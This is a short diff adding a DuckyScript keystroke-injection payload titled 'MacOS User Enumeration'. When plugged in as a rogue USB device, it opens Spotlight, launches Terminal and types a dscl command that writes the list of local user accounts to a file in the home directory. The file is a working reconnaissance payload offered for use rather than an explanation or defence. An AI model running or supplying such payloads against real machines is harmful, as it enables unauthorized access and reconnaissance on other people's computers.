@@ -1,0 +1,9 @@
+REM MacOS User Enumeration
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING dscl . list /Users | grep -v '^_' > ~/users.txt
+ENTER
